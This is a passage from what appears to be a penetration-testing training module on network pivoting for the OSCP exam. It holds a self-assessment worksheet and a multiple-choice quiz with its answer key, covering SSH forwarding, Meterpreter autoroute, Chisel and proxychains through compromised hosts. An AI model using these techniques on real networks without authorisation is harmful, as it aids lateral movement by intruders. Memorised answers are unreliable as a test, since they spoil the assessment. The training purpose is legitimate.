Multi-hop pivoting - _____/5\n- [ ] SOCKS proxy via Metasploit - _____/5\n\n**How do you add a route to 10.0.1.0/24 through Meterpreter session 1?**\n\n**What's the difference between autoroute and portfwd in Meterpreter?**\n\n**4. Proxychains**\n\nRate your confidence (1-5):\n- [ ] Configuring proxychains.conf - _____/5\n- [ ] Using proxychains with various tools - _____/5\n- [ ] Troubleshooting proxychains issues - _____/5\n\n**What file do you edit to configure proxychains, and what line do you add for a SOCKS5 proxy on port 1080?**\n\n**Which tools can/cannot work through proxychains? Give 3 examples each:**\n\n**5. Multi-Hop Pivoting**\n\nRate your confidence (1-5):\n- [ ] Planning pivot routes - _____/5\n- [ ] Documenting network topology - _____/5\n- [ ] Double/triple pivoting - _____/5\n- [ ] Troubleshooting pivot chains - _____/5\n\n**Draw a network diagram showing how you would pivot from Internet → DMZ → Internal → Admin network:**\n\n**What challenges arise with multi-hop pivoting, and how do you address them?**\n\n**6. Real-World Application**\n\n**Scenario 1:** You compromise a web server (10.0.0.5) that can access an internal database (10.0.1.100:3306). You need to run SQLMap against it. What's your approach?\n\n**Scenario 2:** You have Meterpreter on a host with two NICs: 192.168.1.50 (external) and 10.0.1.50 (internal). You discover port 445 open on 10.0.1.0/24. How do you scan and exploit?\n\n**Scenario 3:** SSH port 22 is blocked by firewall. Only HTTP/HTTPS allowed. How do you establish a tunnel?\n\n**7. Troubleshooting**\n\n**Common issues and solutions:**\n\n**Issue 1:** SSH tunnel connects but traffic doesn't flow through it.\n**Solution:**\n\n**Issue 2:** Proxychains shows \"Proxy disconnected\" error.\n**Solution:**\n\n**Issue 3:** Metasploit route is added but scanning still fails.\n**Solution:**\n\n**8. Action Plan**\n\n**Skills to practice:**\n1. \n2. \n3. \n\n**Lab exercises:**\n- [ ] Set up 3-tier network (DMZ → Internal → Admin)\n- [ ] Practice all 3 SSH forwarding types\n- [ ] Configure Chisel server and client\n- [ ] Create double-pivot through Metasploit\n- [ ] Use proxychains with 5 different tools\n- [ ] Complete HackTheBox machines requiring pivoting\n\n**Tools to master:**\n- [ ] SSH (all forwarding modes)\n- [ ] Chisel (client and server)\n- [ ] Metasploit autoroute and portfwd\n- [ ] Proxychains configuration\n- [ ] Iodine (DNS tunneling)\n- [ ] sshuttle (transparent proxy)\n\n**OSCP preparation:**\n1. Practice pivoting in PWK labs\n2. Complete 10+ retired machines requiring pivots\n3. Document network diagrams as you discover\n4. Master at least 3 pivoting techniques\n5. Time yourself - pivoting should be quick\n\n**Remember:** Pivoting is essential for real-world pentests and OSCP exam. Networks are segmented - you'll always need to pivot. Practice until it's muscle memory!"
      }
    }
  ],
  "post_assessment": [
    {
      "question": "You need to access an internal MySQL database (10.0.1.100:3306) through a compromised SSH server (10.0.0.5). Which command correctly forwards the MySQL port to your local machine?",
      "options": [
        "ssh -L 3306:10.0.1.100:3306 user@10.0.0.5",
        "ssh -R 3306:10.0.1.100:3306 user@10.0.0.5",
        "ssh -D 3306 user@10.0.0.5",
        "ssh -L 10.0.1.100:3306:3306 user@10.0.0.5"
      ],
      "correct_answer": 0,
      "explanation": "Option A is correct: -L (local forwarding) syntax is `-L [local_port]:[target_host]:[target_port] user@jump_server`. This creates localhost:3306 → 10.0.0.5 → 10.0.1.100:3306. Option B (-R) is reverse forwarding (wrong direction). Option C (-D) creates SOCKS proxy, not port forward. Option D has incorrect syntax (target host shouldn't be first parameter).",
      "question_id": "93bdca58-4c07-4373-aa62-67cac8a02800",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "You have a Meterpreter session on a dual-homed host (interfaces: 10.0.0.5 and 10.0.1.5). You need to scan the internal network 10.0.1.0/24. What command adds the route correctly?",
      "options": [
        "meterpreter > route add 10.0.1.0/24",
        "meterpreter > run autoroute -s 10.0.1.0/24",
        "meterpreter > portfwd add -l 10.0.1.0 -p 24",
        "msf6 > route add 10.0.1.0 255.255.255.0"
      ],
      "correct_answer": 1,
      "explanation": "Option B is correct: `run autoroute -s 10.0.1.0/24` adds a route through the Meterpreter session using CIDR notation. Option A is incomplete (missing session ID). Option C confuses portfwd with routing. Option D requires being in Metasploit console (not Meterpreter prompt) and needs session ID.",
      "question_id": "1976e72b-2280-41ff-97b4-38126c0fe6bb",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "Chisel is preferred over SSH tunneling when:",
      "options": [
        "The target has SSH server running",
        "Port 22 (SSH) is blocked but port 80/443 (HTTP/HTTPS) is allowed",
        "You need better encryption than SSH provides",
        "The target is a Windows machine (SSH doesn't work on Windows)"
      ],
      "correct_answer": 1,
      "explanation": "Option B is correct: Chisel tunnels over HTTP/HTTPS (ports 80/443), bypassing firewalls that block SSH port 22. This is Chisel's primary advantage. Option A is wrong (if SSH works, use it). Option C is wrong (SSH encryption is excellent). Option D is wrong (OpenSSH works on Windows, and Chisel works on both platforms).",
      "question_id": "fdf18ea2-9f48-451f-a7c9-39d6e4c4098f",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "You've set up SSH dynamic forwarding with `ssh -D 1080 user@pivot`. To use this SOCKS proxy with nmap, what's the correct approach?",
      "options": [
        "nmap --proxy socks5://127.0.0.1:1080 target",
        "proxychains nmap -sT -Pn target",
        "nmap -D 1080 target",
        "ssh-proxy nmap target"
      ],
      "correct_answer": 1,
      "explanation": "Option B is correct: nmap doesn't support SOCKS proxies directly, so you must use proxychains with TCP connect scan (-sT) and disable ping (-Pn). Option A uses incorrect syntax (nmap doesn't have --proxy flag). Option C is wrong (-D is not an nmap option). Option D references non-existent command.",
      "question_id": "b46de0d8-d79f-422b-aaf3-b896b539cb86",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "In a multi-hop pivot scenario (Your machine → Pivot1 → Pivot2 → Target), you have Meterpreter sessions 1 (Pivot1) and 2 (Pivot2). How do you route traffic to the target network (10.0.2.0/24) behind Pivot2?",
      "options": [
        "Add route through session 1: route add 10.0.2.0/24 1",
        "Add route through session 2: route add 10.0.2.0/24 2",
        "Add routes through both: route add 10.0.1.0/24 1, then route add 10.0.2.0/24 2",
        "Use double portfwd: portfwd add -l 1 -p 2 -r 10.0.2.0"
      ],
      "correct_answer": 2,
      "explanation": "Option C is correct: In multi-hop pivoting, you need routes for BOTH intermediate networks. Route Pivot1's network (10.0.1.0/24) through session 1, then route target network (10.0.2.0/24) through session 2. This chains the pivots correctly. Options A and B only add one route (won't reach through both pivots). Option D uses incorrect portfwd syntax.",
      "question_id": "c5ed5caa-06e2-4841-bb9b-8dbcd311eaba",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ]
}